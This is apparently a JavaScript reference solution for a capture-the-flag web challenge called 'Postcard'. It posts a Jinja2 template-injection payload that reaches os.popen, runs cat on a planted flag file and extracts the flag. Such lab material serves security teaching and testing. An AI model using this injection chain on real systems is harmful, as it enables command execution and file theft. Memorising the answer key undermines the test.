// Reference solve — Postcard, Acolyte. /preview renders the message as a Jinja2 template. PAYLOAD must be a template
// expression that reaches a Python file-read primitive and prints /tmp/postcard/flag.txt into the card. Implementer-
// supplied; the plan hard-codes no template payload by design.
const base = process.argv[2];
// Walk config -> Config -> __init__ -> __globals__ -> os, then run `cat` on the planted flag file and emit its contents
// into the card. (Autoescaping leaves the HVWA{...} body intact: it contains no markup characters.)
const PAYLOAD = "{{ config.__class__.__init__.__globals__.os.popen('cat /tmp/postcard/flag.txt').read() }}";
const res = await fetch(`${base}/preview`, {
  method: 'POST', headers: { 'content-type': 'application/x-www-form-urlencoded' },
  body: new URLSearchParams({ style: 'Birthday', message: PAYLOAD }),
});
const m = (await res.text()).match(/HVWA\{[a-z2-7]{26}\}/);
if (m) console.log(m[0]);
